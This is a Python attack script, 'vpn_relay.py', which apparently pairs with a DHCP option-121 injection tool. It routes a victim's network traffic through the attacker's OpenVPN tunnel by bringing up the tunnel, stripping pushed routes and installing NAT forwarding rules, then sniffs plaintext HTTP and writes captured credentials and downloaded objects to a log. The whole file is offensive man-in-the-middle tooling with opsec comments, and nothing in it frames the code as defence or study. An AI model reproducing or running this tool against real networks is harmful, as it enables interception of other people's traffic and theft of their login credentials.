#!/usr/bin/env python3
"""
vpn_relay.py — VPN relay + credential intercept orchestrator v1.0

Complements 121.py (option-121 DHCP injection).

Flow:
  1. Find / verify OpenVPN profile (autologin assumed).
  2. Block victim traffic forwarding during VPN bring-up (avoid plaintext leak).
  3. Bring up VPN tunnel via OpenVPN if not already up.
  4. Remove redirect-gateway routes pushed by OpenVPN (opsec: no .ovpn edits).
  5. Install NAT + forwarding rules so victim traffic relays through tun.
  6. Open forward chain — victim traffic now exits via attacker's VPN tunnel.
  7. Sniff physical interface: capture HTTP credentials + downloaded objects.

NOTE: Double NAT is an inherent architectural constraint — the VPN server sees
the attacker's tun0 IP, not the victim's. This is unavoidable without VPN
server cooperation and does not affect the interception capability.

Run as root / Administrator.
"""
VERSION = "1.1"

import argparse
import atexit
import datetime
import os
import signal
import subprocess
import sys
import threading
import time

# ── Platform-specific backend ─────────────────────────────────────────────────

if sys.platform == "win32":
    from _relay_windows import (
        find_tun_iface, wait_for_tun,
        find_ovpn_path, find_profiles,
        snapshot_routes, remove_pushed_routes,
        block_forward, unblock_forward,
        setup_forwarding, teardown_forwarding,
        detect_phys_iface, list_phys_ifaces,
    )
else:
    from _relay_linux import (
        find_tun_iface, wait_for_tun,
        find_ovpn_path, find_profiles,
        snapshot_routes, remove_pushed_routes,
        block_forward, unblock_forward,
        setup_forwarding, teardown_forwarding,
        detect_phys_iface, list_phys_ifaces,
    )

import http_intercept

# ── Globals ───────────────────────────────────────────────────────────────────

_openvpn_proc: subprocess.Popen | None = None
_cleanup_done = False


# ── Cleanup ───────────────────────────────────────────────────────────────────

def _cleanup() -> None:
    global _cleanup_done
    if _cleanup_done:
        return
    _cleanup_done = True
    print("\n[*] Shutting down...")
    unblock_forward()       # safe to call even if never blocked
    teardown_forwarding()   # safe to call even if never set up
    if _openvpn_proc and _openvpn_proc.poll() is None:
        _openvpn_proc.terminate()
        try:
            _openvpn_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            _openvpn_proc.kill()
    print("[*] Done.")


atexit.register(_cleanup)
signal.signal(signal.SIGTERM, lambda *_: (_cleanup(), sys.exit(0)))
signal.signal(signal.SIGINT,  lambda *_: (_cleanup(), sys.exit(0)))


# ── Interface helpers ─────────────────────────────────────────────────────────

def _list_ifaces(auto_phys: str | None, tun: str | None) -> None:
    ifaces = list_phys_ifaces()
    # Append any tun interfaces not already in the list
    existing_tun = find_tun_iface()
    if existing_tun:
        ifaces.append((existing_tun, "tun", "up"))
    print(f"\n{'Interface':<16} {'Type':<8} {'State':<8} {'Note'}")
    print("─" * 52)
    for name, itype, state in ifaces:
        notes = []
        if name == auto_phys:
            notes.append("← auto-selected (physical)")
        if name == tun or name == existing_tun:
            notes.append("← VPN / sniff target")
        print(f"{name:<16} {itype:<8} {state:<8} {', '.join(notes)}")
    print()


# ── Profile helpers ───────────────────────────────────────────────────────────

def _check_autologin(profile_path: str) -> bool:
    """Return True if the profile has auth-user-pass <file> (autologin)."""
    try:
        with open(profile_path, errors="replace") as f:
            for line in f:
                stripped = line.strip()
                if stripped.startswith("auth-user-pass"):
                    parts = stripped.split()
                    # bare 'auth-user-pass' = interactive; with filename = autologin
                    return len(parts) >= 2
    except OSError:
        pass
    return False


def _list_profiles(profiles: list) -> None:
    print(f"\n{'#':<4} {'Autologin':<11} {'Modified':<22} Path")
    print("─" * 80)
    for i, (path, mtime) in enumerate(profiles, 1):
        dt   = datetime.datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M")
        auto = "YES" if _check_autologin(path) else "NO"
        print(f"{i:<4} {auto:<11} {dt:<22} {path}")
    print()


def _select_profile(profiles: list, profile_arg: str | None) -> str:
    if profile_arg:
        if not os.path.isfile(profile_arg):
            sys.exit(f"[!] Profile not found: {profile_arg}")
        return profile_arg
    if not profiles:
        sys.exit(
            "[!] No .ovpn profiles found.\n"
            "    Use --profile <path> or --profile-dir <dir>."
        )
    path, mtime = profiles[0]
    dt = datetime.datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M")
    print(f"[*] Selected profile: {path}  (modified {dt})")
    if not _check_autologin(path):
        print("[!] Warning: profile may require interactive auth — no 'auth-user-pass <file>' found")
    return path


# ── OpenVPN lifecycle ─────────────────────────────────────────────────────────

def _start_openvpn(profile: str, ovpn_bin: str) -> subprocess.Popen:
    global _openvpn_proc
    proc = subprocess.Popen(
        [ovpn_bin, "--config", profile],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.STDOUT,
    )
    _openvpn_proc = proc
    print(f"[*] OpenVPN started (pid {proc.pid}) — {os.path.basename(profile)}")
    return proc


def _watch_openvpn(
    proc: subprocess.Popen,
    profile: str,
    ovpn_bin: str,
    pre_routes: set,
) -> None:
    """Daemon thread: restart OpenVPN if it exits; re-clean pushed routes after restart."""
    global _openvpn_proc
    while True:
        time.sleep(5)
        if proc.poll() is not None:
            print(f"[!] OpenVPN exited (rc={proc.returncode}) — restarting...")
            proc = _start_openvpn(profile, ovpn_bin)
            tun = wait_for_tun(timeout=30)
            if tun:
                remove_pushed_routes(pre_routes)
            else:
                print("[!] tun interface did not re-appear after OpenVPN restart")


# ── Pushed-route monitor ──────────────────────────────────────────────────────

def _route_monitor(pre_routes: set, interval: int = 30) -> None:
    """Daemon thread: periodically re-remove redirect-gateway routes after VPN re-keys."""
    while True:
        time.sleep(interval)
        remove_pushed_routes(pre_routes)


# ── Entry point ───────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description=f"VPN relay + intercept orchestrator v{VERSION}"
    )
    parser.add_argument(
        "-i", "--iface", default=None,
        help="Physical interface facing the victim (default: auto-detect ethernet→wifi)",
    )
    parser.add_argument(
        "--list-ifaces", action="store_true",
        help="List available interfaces with auto-selection hints, then exit",
    )
    parser.add_argument(
        "--profile", default=None,
        help="Path to a specific .ovpn profile (overrides auto-selection)",
    )
    parser.add_argument(
        "--profile-dir", default=None,
        help="Extra directory to search for .ovpn profiles",
    )
    parser.add_argument(
        "--list-profiles", action="store_true",
        help="List all discovered .ovpn profiles with autologin status, then exit",
    )
    parser.add_argument(
        "--tun-timeout", type=int, default=30,
        help="Seconds to wait for tun interface after OpenVPN starts (default: 30)",
    )
    parser.add_argument(
        "--cred-log", default="creds.log",
        help="File to append captured credentials to (default: creds.log)",
    )
    args = parser.parse_args()

    # ── Interface resolution ──────────────────────────────────────────────────
    auto_phys = detect_phys_iface()
    phys_iface = args.iface or auto_phys

    if args.list_ifaces:
        _list_ifaces(auto_phys, find_tun_iface())
        return

    if not phys_iface:
        sys.exit(
            "[!] Could not auto-detect a physical interface.\n"
            "    Specify one with -i <iface> or check with --list-ifaces."
        )
    if not args.iface:
        print(f"[*] Auto-selected interface: {phys_iface}")

    extra_dirs = (args.profile_dir,) if args.profile_dir else ()
    profiles   = find_profiles(extra_dirs)

    if args.list_profiles:
        _list_profiles(profiles)
        return

    profile  = _select_profile(profiles, args.profile)
    ovpn_bin = find_ovpn_path()

    # ── 1. Block forwarding during VPN bring-up ───────────────────────────────
    print("[*] Blocking FORWARD during VPN bring-up...")
    block_forward()

    pre_routes = snapshot_routes()

    # ── 2. Bring VPN up if needed ─────────────────────────────────────────────
    existing_tun = find_tun_iface()
    if existing_tun:
        print(f"[*] VPN interface already up: {existing_tun}")
        tun_iface = existing_tun
    else:
        proc      = _start_openvpn(profile, ovpn_bin)
        print(f"[*] Waiting up to {args.tun_timeout}s for tun interface...")
        tun_iface = wait_for_tun(timeout=args.tun_timeout)
        if not tun_iface:
            _cleanup()
            sys.exit(
                "[!] tun interface did not come up within the timeout.\n"
                "    Check OpenVPN logs / credentials in the profile."
            )
        print(f"[*] VPN up on interface: {tun_iface}")

        # ── 3. Strip pushed routes (no .ovpn modification) ───────────────────
        remove_pushed_routes(pre_routes)

        # ── 4. Watch OpenVPN process in background ────────────────────────────
        threading.Thread(
            target=_watch_openvpn,
            args=(proc, profile, ovpn_bin, pre_routes),
            daemon=True,
        ).start()

    # ── 5. Install forwarding rules ───────────────────────────────────────────
    setup_forwarding(phys_iface, tun_iface)

    # ── 6. Open forward chain ─────────────────────────────────────────────────
    unblock_forward()
    print(f"[*] Victim traffic is now relaying: {phys_iface} → {tun_iface}")

    # ── 7. Periodic pushed-route cleanup ─────────────────────────────────────
    threading.Thread(
        target=_route_monitor,
        args=(pre_routes,),
        daemon=True,
    ).start()

    # ── 8. Credential + HTTP object sniffing ──────────────────────────────────
    # Sniff on the TUN interface: all cleartext HTTP (both forwarded victim
    # traffic and attacker's own tunnel traffic) is visible there as plaintext.
    # The physical interface only carries encrypted VPN UDP.
    http_intercept.CRED_LOG = args.cred_log
    print(f"[*] Credential log : {os.path.abspath(args.cred_log)}")
    print(f"[*] HTTP objects   : {http_intercept.INTERCEPT_DIR}")
    print(f"[*] Sniffing on    : {tun_iface}  (plaintext tunnel traffic)")
    print("[*] Ready — Ctrl+C to stop\n")
    http_intercept.sniff_loop(iface=tun_iface)


if __name__ == "__main__":
    main()
